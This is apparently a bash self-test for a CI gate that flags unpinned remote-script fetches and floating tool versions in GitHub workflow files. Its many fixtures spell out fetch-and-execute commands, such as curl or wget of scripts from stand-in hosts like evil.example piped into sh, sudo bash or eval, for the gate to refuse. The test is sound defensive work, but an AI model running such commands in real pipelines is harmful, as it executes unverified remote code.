#!/usr/bin/env bash
# provenance: candidate; ttl: 2027-04-01; pinning: true
# template-workflow-pins-selftest.sh — the gate must pass the pinned form and fail,
# naming file:line, on each unpinned-remote-script and floating-version shape; and
# the REAL template must pass, so this goes red if the template regresses.
set -uo pipefail
here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GATE="$here/../template-workflow-pins.sh"
REAL="$here/../../prod-new/template/.github/workflows"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
n=0; fail=0
SHA=b254e6d92f28c3868a755f62fb3ca8f26e9fee76
check() { n=$((n+1)); if [[ "$2" != 0 ]]; then echo "FAIL: $1" >&2; fail=$((fail+1)); fi; }

# fixture NAME LINE... -> dir with one workflow whose step run is LINE
fixture() { mkdir -p "$T/$1"; printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: %s\n' "$2" > "$T/$1/w.yaml"; }
expect_fail() { # name, run-line, expected line number
  fixture "$1" "$2"; local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
  [[ $rc == 1 ]] && grep -qF "w.yaml:$3:" <<<"$o" && grep -qF -- "${4:-$2}" <<<"$o"; check "$1 fails rc=1 naming w.yaml:$3" $?
}

fixture pinned "curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/install.sh | sh -s -- -b /usr/local/bin v1.0.0"
o="$(bash "$GATE" "$T/pinned" 2>&1)"; rc=$?
[[ $rc == 0 ]] && grep -qF "remote_steps=1" <<<"$o"; check "pinned commit passes and counts one remote step" $?

expect_fail main   "curl -sSfL https://raw.githubusercontent.com/o/r/main/install.sh | sh" 5
expect_fail master "bash <(curl -sSfL https://raw.githubusercontent.com/o/r/master/install.sh)" 5
expect_fail short  "curl -sSfL https://raw.githubusercontent.com/o/r/abc1234/i.sh | bash" 5
expect_fail other  "curl -sSfL https://example.invalid/i.sh | sh" 5
expect_fail subst  'sh -c "$(curl -fsSL https://github.com/o/r/raw/HEAD/i.sh)"' 5
expect_fail golatest "go install example.invalid/x@latest" 5
expect_fail gomain   "go install example.invalid/x@main" 5

# sumok was replaced (PS-A2 review): it asserted that a checksum in the step exempts a
# PIPE, which is wrong -- a stream never touches disk, so no checksum covers it.
# Its two successors state the new rule.
fixture sumpipe "curl -sSfL https://example.invalid/i.sh | sh; sha256sum -c i.sum"
o="$(bash "$GATE" "$T/sumpipe" 2>&1)"; rc=$?
[[ $rc == 1 ]] && grep -qF "w.yaml:5:" <<<"$o"; check "other host: pipe + checksum in the step is still a finding" $?
fixture sumfile "curl -sSfL -o i.sh https://example.invalid/i.sh && sha256sum -c i.sum"
bash "$GATE" "$T/sumfile" >/dev/null 2>&1; [[ $? == 1 ]]; check "other host: file download + checksum is REFUSED (PS-A6: only a pinned raw URL or a release asset with an in-step echo-sum check is accepted)" $?

mkdir -p "$T/comment"; printf 'steps:\n  # run: curl https://raw.githubusercontent.com/o/r/main/i.sh | sh\n  - run: echo ok\n' > "$T/comment/w.yaml"
bash "$GATE" "$T/comment" >/dev/null 2>&1; check "commented-out offending line passes" $?

mkdir -p "$T/empty"; bash "$GATE" "$T/empty" >/dev/null 2>&1; rc=$?
[[ $rc == 2 ]]; check "empty directory exits 2" $?

bash "$GATE" "$REAL" >/dev/null 2>&1; check "the real template workflows pass" $?

# ======================= PS-A2: the rule judges the FETCH =======================
# provenance: candidate; ttl: 2027-04-01; pinning: true (every case pins one shape the review reproduced)
mk() { mkdir -p "$T/$1"; cat > "$T/$1/w.yaml"; }   # workflow text on stdin
bad() { # name, expected line, [needle]
  local o rc; o="$(bash "$GATE" "$T/$1" 2>&1)"; rc=$?
  # PS-A6: the finding TEXTS changed with the allowlist design (the old needles named the old
  # table cells); the expectation that matters, REFUSED rc=1 naming the line, is unchanged.
  [[ $rc == 1 ]] && grep -qF "w.yaml:$2:" <<<"$o"; check "$1: rc=1 names w.yaml:$2${3:+ (was: $3)}" $?
}
# PS-A6 RE-EXPECTED toward REFUSED: shapes the allowlist deliberately refuses (no accepted shape,
# $( ) / quoted-word / wrapper primitives, mentions that pipe or redirect, multi-URL fetches,
# compound-wrapped fetches). Each used to pass; none is accepted now.
REEXPECT=" \
  ok_releasefile ok_sumcheckflag ok_stdout_probe ok_pinned_file ok_pinned_blob ok_pinned_archive \
  ok_pinned_api ok_gist_pinned ok_codeload_pinned ok_pinned_query ok_wget_stdout ok_andand \
  ok_semi ok_oror ok_tab_sum ok_apt ok_devnull ok_shasumcheck \
  ok_varsum ok_goflag ok_closed_subst ml_checksum_other_line ml_dash_in_block r2_ok_contents_ref \
  r2_ok_commits r2_ok_trees r2_ok_zipball r2_ok_upper_sha r2_ok_gh_tarball r2_ok_o_dash \
  r2_ok_o_dash2 r2_ok_wget_stdout2 r2_ok_wget_longout r2_ok_sum_glued r2_ok_apt_curl r2_ok_command_v \
  r2_ok_which r2_ok_version r2_ok_discard_w r2_ok_discard_redir r2_ok_discard_redir2 r2_ok_head_I \
  r2_ok_post_data r2_ok_post_form r2_ok_upload r2_ok_api_print r2_ok_api_grep_head r2_ok_api_assign \
  r2_ok_var_print r2_ok_command_v_file r2_ok_which_file r2_ok_echo_file r2_ok_apt_file r2_ok_image_name \
  r2_ok_heredoc_dash r3_echo_mention r3_hash_mention r3_apt_mention r3_aptget_mention r3_post_raw_request \
  r3_post_raw_d r3_post_raw_T r3_post_wget r3_devnull_redir r3_head_I r3_head_pipe_inert \
  a5_ok_pinned_in_group a5_ok_pinned_in_if a5_ok_discard_in_if a5_ok_two_urls_two_o a5_ok_two_urls_O_all a5_ok_head_two \
  a5_ok_jq_assign a5_ok_echo_quoted_nopipe a5_ok_pinned_dotted_pct \
"
good() {
  if [[ "$REEXPECT" == *" $1 "* ]]; then bash "$GATE" "$T/$1" >/dev/null 2>&1; [[ $? == 1 ]]; check "$1: now REFUSED rc=1 (PS-A6 allowlist)" $?
  else bash "$GATE" "$T/$1" >/dev/null 2>&1; check "$1: passes rc=0" $?; fi
}
M=https://raw.githubusercontent.com/o/r/main/i.sh
# one-step workflows: the run value on line 5
for spec in \
  "pipe_abs_sh|curl -sSfL $M | /bin/sh" \
  "pipe_sudo_E|curl -sSfL $M | sudo -E bash" \
  "pipe_sudo_u|curl -sSfL $M | sudo -u root sh" \
  "pipe_env|curl -sSfL $M | env sh" \
  "pipe_python|curl -sSfL $M | python3" \
  "pipe_zsh|curl -sSfL $M | zsh" \
  "pipe_dash|curl -sSfL $M | dash" \
  "pipe_any|curl -sSfL $M | tee /tmp/x" \
  "plain_redirect|curl -sSfL https://example.invalid/b > b" \
  "plain_long_output|curl -sSfL --output tool.tgz https://example.invalid/tool.tgz" \
  "abs_curl|/usr/bin/curl -sSfL -o i.sh $M" \
  "tab_go|go	install example.invalid/x@latest" \
  "ref_then_sha_raw|curl -sSfL -o i.sh https://github.com/o/r/raw/main/$SHA/i.sh" \
  "ref_then_sha_rawhost|curl -sSfL -o i.sh https://raw.githubusercontent.com/o/r/main/$SHA/i.sh" \
  "ref_then_sha_blob|curl -sSfL -o i.sh https://github.com/o/r/blob/main/$SHA/i.sh" \
  "ref_then_sha_gist|curl -sSfL -o i.sh https://gist.githubusercontent.com/o/abc/raw/main/$SHA/i.sh" \
  "ref_then_sha_codeload|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz/main/$SHA" \
  "ref_then_sha_archive|curl -sSfL -o a.tgz https://github.com/o/r/archive/main/$SHA.tar.gz" \
  "dl_run_oneline|curl -sSfL -o i.sh $M && sh i.sh" \
  "dl_redirect|curl -sSfL $M > i.sh; sh i.sh" \
  "wget_file|wget -q $M && sh i.sh" \
  "wget_stdout|wget -qO- $M | sh" \
  "source_proc|source <(curl -sSfL $M)" \
  "dot_proc|. <(curl -sSfL $M)" \
  "blob_ref|curl -sSfL -o i.sh https://github.com/o/r/blob/main/i.sh" \
  "raw_ref|curl -sSfL -o i.sh https://github.com/o/r/raw/main/i.sh" \
  "refs_heads|curl -sSfL -o i.sh https://raw.githubusercontent.com/o/r/refs/heads/main/i.sh" \
  "archive_branch|curl -sSfL -o a.tgz https://github.com/o/r/archive/main.tar.gz" \
  "archive_refs|curl -sSfL -o a.tgz https://github.com/o/r/archive/refs/heads/main.tar.gz" \
  "archive_tag|curl -sSfL -o a.tgz https://github.com/o/r/archive/v1.0.0.tar.gz" \
  "codeload_branch|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz/main" \
  "gist_noref|curl -sSfL https://gist.githubusercontent.com/o/abc/raw/i.sh" \
  "api_noref|curl -sSfL -o x.json https://api.github.com/repos/o/r/tarball/main" \
  "schemeless|curl -sSfL raw.githubusercontent.com/o/r/main/i.sh" \
  "latest_dl_sum|curl -sSfL -o b https://github.com/o/r/releases/latest/download/b && sha256sum -c b.sum" \
  "release_nosum|curl -sSfL -o b https://github.com/o/r/releases/download/v1.0.0/b" \
  "release_pipe_sum|curl -sSfL https://github.com/o/r/releases/download/v1.0.0/i.sh | sh; sha256sum -c i.sum" \
  "release_stdout|curl -sSfL https://github.com/o/r/releases/download/v1.0.0/b" \
  "plain_nosum|curl -sSfL -o tool.tgz https://example.invalid/tool.tgz" \
  "plain_wget_nosum|wget -q https://example.invalid/tool.tgz" \
  "gorun_latest|go run example.invalid/x@latest" \
  "goinst_head|go install example.invalid/x@HEAD" \
  "goinst_short|go install example.invalid/x@abc1234" \
  "goinst_branch|go install example.invalid/x@develop" \
  "goinst_upgrade|go install example.invalid/x@upgrade" \
  "goinst_comment|go install example.invalid/x@latest # newest" \
  "goinst_multi|go install example.invalid/a@v1.2.3 example.invalid/b@main" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in pipe_abs_sh pipe_sudo_E pipe_sudo_u pipe_env pipe_python pipe_zsh pipe_dash pipe_any dl_run_oneline dl_redirect wget_file wget_stdout \
         source_proc dot_proc blob_ref raw_ref ref_then_sha_raw ref_then_sha_rawhost ref_then_sha_blob ref_then_sha_gist ref_then_sha_codeload ref_then_sha_archive refs_heads archive_branch archive_refs archive_tag codeload_branch gist_noref api_noref schemeless; do
  bad "$c" 5 "mutable GitHub ref"
done
bad latest_dl_sum 5 "always moves"
bad release_nosum 5 "no checksum verification of the downloaded file"
bad release_pipe_sum 5 "in-stream"
bad release_stdout 5 "no checksum verification of the downloaded file"
bad plain_nosum 5 "no checksum verification in the step"
bad plain_wget_nosum 5 "no checksum verification in the step"
bad plain_redirect 5 "no checksum verification in the step"
bad plain_long_output 5 "no checksum verification in the step"
bad abs_curl 5 "mutable GitHub ref"
bad tab_go 5 "floating tool version"
for c in gorun_latest goinst_head goinst_short goinst_branch goinst_upgrade goinst_comment; do bad "$c" 5 "floating tool version"; done
bad goinst_multi 5 "floating tool version"

# accepted shapes
for spec in \
  "ok_gosem|go install example.invalid/x@v1.2.3" \
  "ok_gopre|go install example.invalid/x@v1.2.3-rc.1+build.5" \
  "ok_gosha|go run example.invalid/x@$SHA" \
  "ok_gowrapped|bash scripts/retry.sh go install example.invalid/x@v2.12.2" \
  "ok_golocal|go install ./cmd/x" \
  "ok_releasefile|curl -sSfL -o b https://github.com/o/r/releases/download/v1.0.0/b && sha256sum -c b.sum" \
  "ok_sumcheckflag|wget -q https://example.invalid/b && sha256sum --check b.sum" \
  "ok_stdout_probe|curl -sSf https://example.invalid/healthz" \
  "ok_pinned_file|curl -sSfL -o i.sh https://github.com/o/r/raw/$SHA/i.sh" \
  "ok_pinned_blob|curl -sSfL https://github.com/o/r/blob/$SHA/i.sh | bash" \
  "ok_pinned_archive|curl -sSfL -o a.tgz https://github.com/o/r/archive/$SHA.tar.gz" \
  "ok_pinned_api|curl -sSfL https://api.github.com/repos/o/r/tarball/$SHA -o a.tgz" \
  "ok_gist_pinned|curl -sSfL -o i.sh https://gist.githubusercontent.com/o/abc/raw/$SHA/i.sh" \
  "ok_codeload_pinned|curl -sSfL -o a.tgz https://codeload.github.com/o/r/tar.gz/$SHA" \
  "ok_pinned_query|curl -sSfL -o a.tgz https://github.com/o/r/archive/$SHA.tar.gz?x=1" \
  "ok_wget_stdout|wget -qO- https://example.invalid/healthz" \
  "ok_andand|curl -sSf https://example.invalid/healthz && echo ok > out.txt" \
  "ok_semi|curl -sSf https://example.invalid/healthz; echo ok > out.txt" \
  "ok_oror|curl -sSf https://example.invalid/healthz || echo no > out.txt" \
  "ok_tab_sum|curl -sSfL -o b https://example.invalid/b && sha256sum	-c b.sum" \
  "ok_apt|sudo apt-get install -y curl" \
  "ok_devnull|curl -sSf https://example.invalid/healthz 2>&1 >/dev/null" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in ok_gosem ok_gopre ok_gosha ok_gowrapped ok_golocal ok_releasefile ok_sumcheckflag ok_stdout_probe ok_pinned_file ok_pinned_blob ok_pinned_archive ok_pinned_api ok_gist_pinned ok_codeload_pinned ok_pinned_query ok_wget_stdout ok_andand ok_semi ok_oror ok_tab_sum ok_apt ok_devnull; do good "$c"; done


# shapes whose run value carries quotes/substitutions: raw text, no shell escaping
one() { mkdir -p "$T/$1"; { printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: '; cat; } > "$T/$1/w.yaml"; }
one eval_subst   <<'X'
eval "$(curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh)"
X
one backtick     <<'X'
eval `curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh`
X
one quoted_dq    <<'X'
"curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh | sh"
X
one quoted_sq    <<'X'
'curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh | sh'
X
one var_url      <<'X'
curl -sSfL "$URL" -o i.sh
X
one var_ref      <<'X'
curl -sSfL -o i.sh https://raw.githubusercontent.com/o/r/$REF/i.sh
X
one var_pipe_sum <<'X'
curl -sSfL "$URL" | sh; sha256sum -c i.sum
X
one goinst_quoted <<'X'
go install "example.invalid/x@latest"
X
one goinst_var   <<'X'
go install example.invalid/x@$V
X
one ok_shasumcheck <<'X'
curl -sSfL -o b https://example.invalid/b && echo "x  b" | shasum -a 256 -c -
X
one ok_varsum    <<'X'
curl -sSfL -o i.sh "$URL" && sha256sum -c i.sum
X
for c in eval_subst backtick quoted_dq quoted_sq; do bad "$c" 5 "mutable GitHub ref"; done
for c in var_url var_ref var_pipe_sum; do bad "$c" 5 "cannot verify what is fetched"; done
bad goinst_quoted 5 "floating tool version"
bad goinst_var 5 "cannot verify go tool version"
good ok_shasumcheck
good ok_varsum
one subst_other_dollar <<'X'
eval "$(curl -sSfL https://example.invalid/i.sh)"; sha256sum -c i.sum
X
one subst_other_proc   <<'X'
source <(curl -sSfL https://example.invalid/i.sh)
X
one subst_other_btick  <<'X'
eval `curl -sSfL https://example.invalid/i.sh`
X
one ok_goquoted <<'X'
go install "example.invalid/x@v1.2.3"
X
one ok_goflag <<'X'
go install -ldflags=-X=u@h example.invalid/x@v1.2.3
X
for c in subst_other_dollar subst_other_proc subst_other_btick; do bad "$c" 5 "consumed in-stream"; done
good ok_goquoted
good ok_goflag
one ok_inline_comment <<'X'
echo ok # curl -sSfL https://raw.githubusercontent.com/o/r/main/i.sh | sh
X
good ok_inline_comment
one ok_closed_subst <<'X'
echo "$(date)"; curl -sSf https://example.invalid/healthz
X
one sum_other_cmd <<'X'
sha256sum b > b.sum; curl -sSfL -c jar -o b https://example.invalid/b
X
good ok_closed_subst
bad sum_other_cmd 5 "no checksum verification in the step"

# multi-line shapes: curl and execution on different lines; folded; continuations
mk ml_literal <<EOF2
jobs:
  j:
    steps:
      - name: x
        run: |
          set -e
          curl -sSfL -o i.sh $M
          sh i.sh
EOF2
bad ml_literal 7 "mutable GitHub ref"
mk ml_folded <<EOF2
jobs:
  j:
    steps:
      - name: x
        run: >
          curl -sSfL
          $M
          | sh
EOF2
bad ml_folded 5 "mutable GitHub ref"
mk ml_continuation <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL \\
            -o i.sh \\
            $M
          sh i.sh
EOF2
bad ml_continuation 5 "mutable GitHub ref"
mk ml_checksum_other_line <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL -o b https://example.invalid/b
          sha256sum -c b.sum
EOF2
good ml_checksum_other_line
mk ml_checksum_other_step <<EOF2
jobs:
  j:
    steps:
      - run: curl -sSfL -o b https://example.invalid/b
      - run: sha256sum -c b.sum
EOF2
bad ml_checksum_other_step 4 "no checksum verification in the step"
mk ml_two_steps <<EOF2
jobs:
  j:
    steps:
      - run: echo fine
      - run: |
          echo hi
          curl -sSfL $M | sh
EOF2
bad ml_two_steps 7 "mutable GitHub ref"
mk ml_crlf_tabs <<EOF2
jobs:
  j:
    steps:
      - name: x
        run: curl -sSfL	$M	| sh
EOF2
sed -i.bak 's/$/\r/' "$T/ml_crlf_tabs/w.yaml"; rm -f "$T/ml_crlf_tabs/w.yaml.bak"
bad ml_crlf_tabs 5 "mutable GitHub ref"
mk ml_pinned_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh
EOF2
good ml_pinned_block
mk ml_name_if <<EOF2
jobs:
  j:
    steps:
      - name: "curl $M | sh is not run here"
        if: "\${{ false }} # curl $M | sh"
        run: echo ok
EOF2
# PS-A9 RE-EXPECTED toward REFUSED: a name: scalar is reinjected by ${{ github.workflow }}, so it is scanned; a name that spells a fetch is refused
bad ml_name_if 4 "name scalar is reinjected"
mk ml_comment_in_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          # curl $M | sh
          echo ok # curl $M | sh
EOF2
# PS-A9 RE-EXPECTED toward REFUSED: shell comments in a block scalar are no longer stripped (the strip desynced from bash); a comment that spells a fetch is refused, reword it
bad ml_comment_in_block 5 "comment that spells a fetch"
mk ml_dash_in_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          cat <<X
          - curl is mentioned
          X
          echo ok
EOF2
good ml_dash_in_block

# CRLF files: pinned forms must still pass (a stray CR must not turn a semver into a finding)
fixture crlf_gosem "go install example.invalid/x@v1.2.3"
mk crlf_block <<EOF2
jobs:
  j:
    steps:
      - run: |
          curl -sSfL https://raw.githubusercontent.com/o/r/$SHA/i.sh | sh
          go install example.invalid/x@v1.2.3
EOF2
for d in crlf_gosem crlf_block; do sed -i.bak 's/$/\r/' "$T/$d/w.yaml"; rm -f "$T/$d/w.yaml.bak"; done
good crlf_gosem
good crlf_block

# a step must not leak across files: a checksum at the top of the NEXT file does not cover this file's fetch
mkdir -p "$T/xfile"
printf 'jobs:\n  j:\n    steps:\n      - name: x\n        run: curl -sSfL -o b https://example.invalid/b\n' > "$T/xfile/a.yaml"
printf 'run: sha256sum -c b.sum\n' > "$T/xfile/b.yaml"
xfile_case() {
  local xo xrc ok=0
  if xo="$(bash "$GATE" "$T/xfile" 2>&1)"; then xrc=0; else xrc=$?; fi
  { [[ $xrc == 1 ]] && grep -qF "a.yaml:5:" <<<"$xo"; } || ok=1
  check "a checksum in the next file does not exempt this file's fetch" "$ok"
}
xfile_case

# internal errors must not be green: a gate that cannot run produces rc != 0
printf 'x' > "$T/empty/notyaml.txt"
if bash "$GATE" "$T/empty" >/dev/null 2>&1; then xrc=0; else xrc=$?; fi; ok=0; [[ $xrc == 2 ]] || ok=1; check "directory with no workflow files still exits 2" "$ok"
mkdir -p "$T/binary"; printf 'jobs:\n  j:\n    steps:\n      - run: \x00\xff\xfe curl\n' > "$T/binary/w.yaml"
if bash "$GATE" "$T/binary" >/dev/null 2>&1; then xrc=0; else xrc=$?; fi; ok=0; [[ $xrc == 0 || $xrc == 1 ]] || ok=1; check "odd bytes do not crash the gate (rc is a verdict, not an awk error)" "$ok"


# ============ PS-A3 (review round 2): default-refuse; every fixture is a table cell ============
# provenance: candidate; ttl: 2027-04-01; pinning: true (each case pins one shape the round-2 review reproduced)
E=https://evil.example/i.sh
for spec in \
  "r2_bare_host|curl -fsSL evil.example/i.sh | sh" \
  "r2_docker|curl get.docker.com | sh" \
  "r2_upper_scheme|curl -fsSL HTTPS://evil.example/i.sh | sh" \
  "r2_ftp|curl -fsSL ftp://evil.example/i.sh | sh" \
  "r2_wget_bare|wget -qO- evil.example/i.sh | sh" \
  "r2_command_curl|command curl -fsSL $E | sh" \
  "r2_backslash_curl|\\curl -fsSL $E | sh" \
  "r2_busybox|busybox wget -O- $E | sh" \
  "r2_sudo_curl|sudo -E curl -fsSL $E | sh" \
  "r2_envassign|X=1 curl -fsSL $E | sh" \
  "r2_if_curl|if curl -fsSL $E | sh; then echo ok; fi" \
  "r2_glued_o|curl -sSLo/tmp/i.sh $E && sh /tmp/i.sh" \
  "r2_glued_o2|curl -o/tmp/i.sh $E && sh /tmp/i.sh" \
  "r2_cluster_O|curl -fsSLO $E && sh i.sh" \
  "r2_long_eq|curl --output=i.sh $E && sh i.sh" \
  "r2_long_sp|curl --output i.sh $E && sh i.sh" \
  "r2_remote_name|curl --remote-name $E && sh i.sh" \
  "r2_remote_name_all|curl --remote-name-all $E && sh i.sh" \
  "r2_wget_default|wget $E && sh i.sh" \
  "r2_wget_Ofile|wget -O i.sh $E && sh i.sh" \
  "r2_wget_Oglued|wget -qOi.sh $E && sh i.sh" \
  "r2_append|curl -sSf $E >> i.sh; sh i.sh" \
  "r2_tar|curl -sSfL https://example.invalid/t.tgz | tar xz -C /usr/local" \
  "r2_o_dash_pipe|curl -sSfo- $E | sh" \
  "r2_post_pipe|curl -sSf -X POST -d x $E | sh" \
  "r2_unknown_sink|curl -sSfL $E | mystery-tool" \
  "r2_xargs|curl -sSfL $E | xargs sh -c" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_bare_host r2_docker r2_upper_scheme r2_ftp r2_wget_bare r2_command_curl r2_backslash_curl r2_busybox r2_sudo_curl r2_envassign r2_if_curl r2_o_dash_pipe r2_post_pipe r2_unknown_sink r2_xargs; do bad "$c" 5 "consumed in-stream"; done
for c in r2_glued_o r2_glued_o2 r2_cluster_O r2_long_eq r2_long_sp r2_remote_name r2_remote_name_all r2_wget_default r2_wget_Ofile r2_wget_Oglued r2_append; do bad "$c" 5 "no checksum verification in the step"; done
bad r2_tar 5 "no checksum verification in the step"
# a file target through the tar/tee sink class is "file": no checksum -> finding text is the file one
fixture r2_tee "curl -sSfL $E | tee /tmp/x"; bad r2_tee 5 "no checksum verification in the step"
fixture r2_tar_file "curl -sSfL https://example.invalid/t.tgz | tar xz"; bad r2_tar_file 5 "no checksum verification in the step"
# the same glued/odd spellings against a GitHub ref and a bare host, and a host in other case
for spec in \
  "r2_gh_upper_host|curl -fsSL RAW.githubusercontent.com/o/r/main/i.sh | sh" \
  "r2_gh_upper_scheme|curl -fsSL HTTPS://Raw.GitHubUserContent.com/o/r/main/i.sh | sh" \
  "r2_gh_glued|curl -sSLo/tmp/i.sh https://raw.githubusercontent.com/o/r/main/i.sh" \
  "r2_api_ref_qs|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh?ref=main\\&x=$SHA | sh" \
  "r2_api_sha_owner|curl -fsSL https://api.github.com/repos/o/$SHA/tarball/main -o a.tgz" \
  "r2_api_repo_sha|curl -fsSL https://api.github.com/repos/$SHA/r/tarball/main -o a.tgz" \
  "r2_api_contents_noref|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh -o i.sh" \
  "r2_api_commits_branch|curl -fsSL https://api.github.com/repos/o/r/commits/main -o c.json" \
  "r2_api_trees_branch|curl -fsSL https://api.github.com/repos/o/r/git/trees/main -o c.json" \
  "r2_api_tarball_noref|curl -fsSL https://api.github.com/repos/o/r/tarball -o a.tgz" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_gh_upper_host r2_gh_upper_scheme r2_gh_glued r2_api_ref_qs r2_api_sha_owner r2_api_repo_sha r2_api_contents_noref r2_api_commits_branch r2_api_trees_branch r2_api_tarball_noref; do bad "$c" 5 "mutable GitHub ref"; done
for spec in \
  "r2_shape_filesha|curl -fsSL -o i.sh https://github.com/o/r/x/main/$SHA/i.sh" \
  "r2_shape_owner_sha|curl -fsSL -o i.sh https://github.com/$SHA/r/x/main/i.sh" \
  "r2_shape_other_host|curl -fsSL -o i.sh https://objects.githubusercontent.com/o/r/$SHA/i.sh" \
  "r2_shape_pulls_file|curl -fsSL https://api.github.com/repos/o/r/pulls/1 -o p.json" \
  "r2_shape_pulls_sh|curl -fsSL https://api.github.com/repos/o/r/pulls/1 | sh" \
  "r2_shape_releases_tag|curl -fsSL -o i.sh https://github.com/o/r/releases/tag/v1" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_shape_filesha r2_shape_owner_sha r2_shape_other_host r2_shape_pulls_file r2_shape_pulls_sh r2_shape_releases_tag; do bad "$c" 5 "unrecognised GitHub URL shape"; done
fixture r2_nourl_pipe "curl -fsSL -K cfg | sh"; bad r2_nourl_pipe 5 "cannot verify what is fetched"
fixture r2_nourl_file "curl -fsSL -K cfg -o x"; bad r2_nourl_file 5 "cannot verify what is fetched"
# sha in ITS position stays ok, in every shape, and with a 40-hex owner too
for spec in \
  "r2_ok_contents_ref|curl -fsSL https://api.github.com/repos/o/r/contents/i.sh?ref=$SHA | sh" \
  "r2_ok_commits|curl -fsSL https://api.github.com/repos/o/r/commits/$SHA -o c.json" \
  "r2_ok_trees|curl -fsSL https://api.github.com/repos/o/r/git/trees/$SHA -o t.json" \
  "r2_ok_zipball|curl -fsSL https://api.github.com/repos/$SHA/r/zipball/$SHA -o z.zip" \
  "r2_ok_upper_sha|curl -fsSL RAW.githubusercontent.com/o/r/$SHA/i.sh | sh" \
  "r2_ok_gh_tarball|curl -fsSL https://github.com/o/r/tarball/$SHA -o t.tgz" \
  "r2_ok_o_dash|curl -sSfo- https://example.invalid/healthz" \
  "r2_ok_o_dash2|curl -sSf -o - https://example.invalid/healthz | jq ." \
  "r2_ok_wget_stdout2|wget -q -O - https://example.invalid/healthz" \
  "r2_ok_wget_longout|wget --output-document=- https://example.invalid/healthz" \
  "r2_ok_sum_glued|curl -sSLo/tmp/b https://example.invalid/b && sha256sum -c b.sum" \
  "r2_ok_apt_curl|apt-get install -y curl wget" \
  "r2_ok_command_v|if ! command -v curl >/dev/null; then echo no; fi" \
  "r2_ok_which|which curl" \
  "r2_ok_echo|echo curl is needed" \
  "r2_ok_version|curl --version | head -n 1" \
  "r2_ok_discard_w|curl -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/ready" \
  "r2_ok_discard_redir|curl -sf https://example.invalid/ready > /dev/null" \
  "r2_ok_discard_redir2|curl -s -f http://127.0.0.1:8080/ready >/dev/null 2>&1" \
  "r2_ok_head|curl --head https://example.invalid/x.tgz" \
  "r2_ok_head_I|curl -sSfI https://example.invalid/x.tgz" \
  "r2_ok_discard_gh|curl -sSf -o /dev/null https://raw.githubusercontent.com/o/r/main/i.sh" \
  "r2_ok_post|curl -sSf -X POST -d '{\"a\":1}' \"\$SOME_URL\"" \
  "r2_ok_post_data|curl -sSf --data-binary @payload.json https://example.invalid/hook" \
  "r2_ok_post_form|curl -sSf -F f=@x.log \$HOOK_URL" \
  "r2_ok_upload|curl -sSf -T report.txt https://example.invalid/up" \
  "r2_ok_api_print|curl -sSf https://api.github.com/repos/o/r/pulls/1" \
  "r2_ok_api_jq|curl -sSf https://api.github.com/repos/o/r/pulls/1 | jq -r .title" \
  "r2_ok_api_grep_head|curl -sSf https://api.github.com/repos/o/r/pulls/1 | grep state | head -n 1" \
  "r2_ok_api_assign|V=\$(curl -sSf https://api.github.com/repos/o/r/releases/latest | jq -r .tag_name)" \
  "r2_ok_var_print|curl -sSf \"\$URL\"" \
  "r2_ok_wget_spider|wget -q --spider https://example.invalid/x" ; do
  fixture "${spec%%|*}" "${spec#*|}"
done
for c in r2_ok_contents_ref r2_ok_commits r2_ok_trees r2_ok_zipball r2_ok_upper_sha r2_ok_gh_tarball r2_ok_o_dash r2_ok_o_dash2 r2_ok_wget_stdout2 r2_ok_wget_longout r2_ok_sum_glued \
         r2_ok_apt_curl r2_ok_command_v r2_ok_which r2_ok_echo r2_ok_version r2_ok_discard_w r2_ok_discard_redir r2_ok_discard_redir2 r2_ok_head r2_ok_head_I r2_ok_discard_gh \
         r2_ok_post r2_ok_post_data r2_ok_post_form r2_ok_upload r2_ok_api_print r2_ok_api_jq r2_ok_api_grep_head r2_ok_api_assign r2_ok_var_print r2_ok_wget_spider; do good "$c"; done
# the reviewer's wording, run through the gate verbatim: the webhook POST piped into a shell / saved stays a finding
fixture r2_post_saved "curl -sSf -X POST -d x \"\$SOME_URL\" -o r.sh && sh r.sh"; bad r2_post_saved 5 "cannot verify what is fetched"
fixture r2_post_piped "curl -sSf -d x \"\$SOME_URL\" | sh"; bad r2_post_piped 5 "cannot verify what is fetched"
fixture r2_api_eval "eval \"\$(curl -sSf https://api.github.com/repos/o/r/pulls/1)\""; bad r2_api_eval 5 "unrecognised GitHub URL shape"
fixture r2_api_assign_sh "V=\$(curl -sSf https://api.github.com/repos/o/r/pulls/1 | sh)"; bad r2_api_assign_sh 5 "unrecognised GitHub URL shape"
fixture r2_gh_content_print "curl -sSf https://raw.githubusercontent.com/o/r/main/i.sh | jq ."; bad r2_gh_content_print 5 "mutable GitHub ref"

# negative space of the command-position rule: only a MENTION may be skipped, and each skip needs a case where the mention is not harmless
fixture r2_ok_command_v_file "command -v curl > tools.txt"; good r2_ok_command_v_file
fixture r2_ok_which_file "which curl wget > tools.txt"; good r2_ok_which_file
fixture r2_ok_echo_file "echo curl > list.txt"; good r2_ok_echo_file
fixture r2_ok_apt_file "sudo apt-get install -y curl wget > apt.log"; good r2_ok_apt_file
fixture r2_ok_image_name "docker run --rm curlimages/curl -sf https://example.invalid/x > out.txt"; good r2_ok_image_name
mk r2_ok_heredoc_dash <<EOF2
jobs:
  j:
    steps:
      - run: |
